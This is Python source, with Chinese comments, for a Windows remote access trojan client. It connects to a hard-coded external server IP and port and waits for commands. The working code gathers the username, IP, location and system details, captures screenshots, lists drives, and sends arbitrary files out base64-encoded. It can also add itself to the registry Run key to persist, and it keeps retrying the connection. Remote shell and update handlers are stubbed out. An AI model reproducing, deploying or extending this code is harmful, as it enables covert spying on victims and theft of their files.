import base64
import getpass
import json
import os
import platform
import re
import socket
import sys
import time
import winreg
import pyautogui
import requests
import win32api
import win32con

# 取电脑信息
def getsystem_info(s):
    print('0')
    try:
        addr_ip = requests.get('http://whois.pconline.com.cn/ipJson.jsp').text
        # print(addr_ip)
        ip = re.findall(re.compile(r'"ip":"(.*?)"'), addr_ip)
        if len(ip) > 0:
            ip = re.findall(re.compile(r'"ip":"(.*?)"'), addr_ip)[0]
        else:
            ip = '获取失败'
        addr = re.findall(re.compile(r'"addr":"(.*?)"'), addr_ip)
        if len(addr) > 0:
            addr = re.findall(re.compile(r'"addr":"(.*?)"'), addr_ip)[0]
        else:
            ip = '获取失败'
        print(1)
        username = getpass.getuser()
        print(2)
        system = platform.platform()
        print(3)
        system_info = {
            'cmd': '/system_info',
            'info': {
                'username': username,
                'ip': ip,
                'system': system,
                'address': addr,
                'v': '1.0.0'
            }
        }
        s.send(json.dumps(system_info).encode())
    except:
        print('获取电脑数据失败')
        s.send(json.dumps({
            'cmd': '/system_info',
            'info': {
                'username': '获取时出错',
                'ip': '获取时出错',
                'system': '获取时出错',
                'address': '获取时出错'
            }
        }).encode())


# 屏幕截图
def screenshots(s):
    def imageToStr(path):
        with open(path, 'rb') as f:
            img_byte = base64.b64encode(f.read())
        img_str = img_byte.decode('ascii')
        return img_str

    im = pyautogui.screenshot()
    im.save("C:/114514.jpg")
    img = 'C:/114514.jpg'
    img1 = imageToStr(img)
    data = {
        "cmd": "/jietu",
        "image": img1
    }
    s.send(json.dumps(data).encode())
    os.remove('C:/114514.jpg')

# 远程更新
def updata(s, url, url1, uptype):
    pass

# 开机自启
def auto_run():
    def zhao():
        location = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        # 获取注册表该位置的所有键值
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, location)
        i = 0
        while True:
            try:
                # 获取注册表对应位置的键和值
                # print(winreg.EnumValue(key, i)[0], winreg.EnumValue(key, i)[1])
                if winreg.EnumValue(key, i)[0] == os.path.basename(sys.argv[0]):
                    return True
                i += 1
            except OSError as error:
                # 一定要关闭这个键
                winreg.CloseKey(key)
                break

    flag = zhao()
    if flag:
        pass
    else:
        sys.setrecursionlimit(1000000)
        # name = os.path.basename(sys.argv[0])
        name = "test_autorun"
        path = f'"{os.getcwd()}\\{os.path.basename(sys.argv[0])}"'
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                                  win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)


# 盘符获取
def path_get(s):
    res = "".join(os.popen('fsutil volume list').readlines())
    print(res)
    list_p = re.findall(re.compile(r'(.*?):'), res)
    del (list_p[0])
    print(list_p)
    s.send(json.dumps({
        'cmd': '/path_read',
        'path': list_p
    }).encode())


# 文件读取
def file_read(s, path1):
    path = None
    if len(path1) <= 3:
        path = path1
    else:
        path = path1[:-1]

    print(path)
    print(os.path.isfile(path))
    if os.path.isfile(path):
        def ToStr(path):
            with open(path, 'rb') as f:
                byte = base64.b64encode(f.read())
                datastr = byte.decode('ascii')
                return datastr
        # 如果是文件的话 就返回给服务器
        ba64 = ToStr(path)
        print(ba64)
        # return
        print('是文件哦')
        s.send(json.dumps({
            'cmd': '/file_download',
            'fname': os.path.basename(path),
            'data': ba64
        }).encode())
    else:
        s.send(json.dumps({
            'cmd': '/file_read',
            'list': os.listdir(path),
            'folder': True
        }).encode())


def shell(s, shell_cmd):
    pass


# 接受指令
def tcpClient(s):
    print('服务器连接成功')
    while True:
        try:
            data = s.recv(2048).decode()
            json_data = json.loads(data)
            # -------识别指令--------
            match json_data['cmd']:
                case '/system_info':
                    getsystem_info(s)
                case '/jietu':
                    screenshots(s)
                case '/chat':
                    print(json_data['msg_data'])
                case '/path_read':
                    path_get(s)
                case '/file_read':
                    file_read(s, json_data['path'])
                case '/shell':
                    pass
                case '/update':
                    updata(s, json_data['url'], json_data['url1'], json_data['uptype'])
                case _:
                    print('其他信息:', json_data)
        except:
            print('指令执行错误')
            s.close()
            connect()
            return


# 连接服务器
def connect():
    host = "43.249.193.55"
    port = 20098
    try:
        s = socket.socket()
        s.connect((host, port))
        tcpClient(s)
    except:
        print('服务器连接失败 1s 后重试')
        time.sleep(1)
        connect()


# 入口
if __name__ == '__main__':
    # time.sleep(10)
    # auto_run()
    connect()
